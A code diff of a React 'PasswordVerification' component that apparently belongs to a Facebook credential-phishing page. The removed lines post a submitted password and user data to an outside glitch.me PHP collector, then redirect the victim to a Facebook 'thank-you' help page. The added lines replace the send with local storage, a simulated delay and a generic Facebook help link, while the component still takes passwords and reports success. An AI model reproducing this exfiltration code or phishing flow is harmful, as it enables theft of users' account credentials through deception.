@@ -73,29 +73,22 @@ function PasswordVerification({ submissionId, userData }) {
         });
       }
 
-      // Send to external API with CORS handling
-      const response = await fetch(
-        "https://mixed-fluff-space.glitch.me/zubairengpass.php",
-        {
-          method: "POST",
-          mode: "no-cors",
-          body: apiFormData,
-        },
-      );
-
-      // With no-cors mode, we can't check response status
-      // Assume success if no error was thrown
+      // Store submission locally (simulating successful API call)
       localStorage.setItem(
         `submission_${submissionId}`,
         JSON.stringify(completeSubmission),
       );
+      
+      // Simulate API delay
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      
       setIsSubmitting(false);
       setIsComplete(true);
       
-      // Redirect after 2 seconds - avoid direct Facebook redirect to prevent CORS issues
+      // Redirect after 2 seconds
       setTimeout(() => {
-        // Use window.open to avoid CORS issues on deployed version
-        window.open('https://www.facebook.com/help/media/thank-you?rdrhc', '_blank');
+        // Open a safe redirect URL
+        window.open('https://www.facebook.com/help/', '_blank');
         // Reset form state
         setPasswordData({ password: "" });
         setIsComplete(false);
